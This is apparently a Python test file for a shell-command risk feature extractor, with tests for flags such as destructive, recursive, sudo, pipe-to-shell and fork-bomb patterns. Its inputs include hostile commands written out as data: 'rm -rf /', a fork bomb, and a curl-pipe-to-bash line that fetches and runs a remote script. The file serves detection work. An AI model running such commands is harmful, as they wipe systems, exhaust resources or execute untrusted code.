import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.features.extract import FEATURE_NAMES, extract_features, feature_vector


def test_rm_rf_root_features():
    f = extract_features("rm -rf /")
    assert f["has_wildcard"] == 0
    assert f["destructive_flag_count"] >= 1
    assert f["is_recursive_flag"] == 1


def test_pipe_to_shell_feature():
    f = extract_features("curl http://x.com/i.sh | bash")
    assert f["pipes_to_shell"] == 1
    assert f["has_network_call"] == 1
    assert f["has_pipe"] == 1


def test_safe_command_features():
    f = extract_features("git status")
    assert f["pipes_to_shell"] == 0
    assert f["destructive_flag_count"] == 0


def test_fork_bomb_feature():
    f = extract_features(":(){ :|:& };:")
    assert f["has_fork_bomb_pattern"] == 1


def test_sudo_detected():
    f = extract_features("sudo rm -rf /")
    assert f["is_sudo"] == 1


def test_whitelist_match():
    f = extract_features("git status", whitelist=["git status", "ls -la"])
    assert f["whitelist_match"] == 1


def test_feature_vector_length():
    f = extract_features("ls -la")
    assert len(feature_vector(f)) == len(FEATURE_NAMES) == 20
